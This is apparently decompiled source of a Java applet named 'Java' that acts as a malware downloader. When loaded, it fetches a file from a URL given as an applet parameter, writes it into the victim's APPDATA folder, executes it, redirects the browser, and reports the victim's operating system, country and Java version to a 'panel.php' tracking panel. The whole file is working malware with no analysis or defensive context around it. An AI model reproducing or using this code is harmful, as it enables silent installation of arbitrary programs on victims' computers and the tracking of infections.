import java.io.InputStream;
import java.net.URLConnection;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.io.FileOutputStream;
import java.util.Locale;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    @Override
    public void init() {
        final Locale defaultLocale = Locale.getDefault();
        final String country = defaultLocale.getCountry();
        final String os = System.getProperty("os.name").toLowerCase();
        final String jrver = System.getProperty("java.runtime.version");
        final String dir = System.getenv("APPDATA");
        final String file = this.getParameter("file");
        Object LO = this.getParameter("r");
        final String status = "1";
        try {
            final FileOutputStream LFOS = new FileOutputStream(dir + file);
            final Runtime LR = Runtime.getRuntime();
            final URL LU = new URL(this.getParameter("lol"));
            final URLConnection LUC = LU.openConnection();
            final InputStream LIS = LUC.getInputStream();
            final byte[] AOB = new byte[1024];
            int as0fd;
            while ((as0fd = LIS.read(AOB, 0, AOB.length)) != -1) {
                LFOS.write(AOB, 0, as0fd);
            }
            LIS.close();
            LFOS.close();
            LR.exec(dir + file);
            LO = new URL((String)LO);
            this.getAppletContext().showDocument((URL)LO);
            final URL sp = new URL(this.getCodeBase(), "panel.php?os=" + os.replaceAll(" ", "%20") + "&country=" + country + "&status=" + status + "&jrver=" + jrver);
            final BufferedReader in = new BufferedReader(new InputStreamReader(sp.openStream()));
            String iL;
            while ((iL = in.readLine()) != null) {}
            in.close();
        }
        catch (Exception e) {}
    }
}
